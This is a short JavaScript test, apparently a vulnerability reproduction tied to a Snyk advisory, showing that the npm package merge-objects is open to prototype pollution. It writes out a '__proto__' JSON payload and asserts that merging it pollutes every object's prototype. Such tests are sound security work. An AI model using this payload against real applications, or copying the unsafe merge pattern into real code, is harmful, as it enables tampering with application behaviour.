//https://snyk.io/vuln/npm:merge-objects:20180415
test("prototype pollution in merge-objects", () => {
  const merge = require("merge-objects");
  const malicious_payload = '{"__proto__":{"polluted":"yes"}}';

  obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(malicious_payload));
  expect({}.polluted).toBe("yes");
});
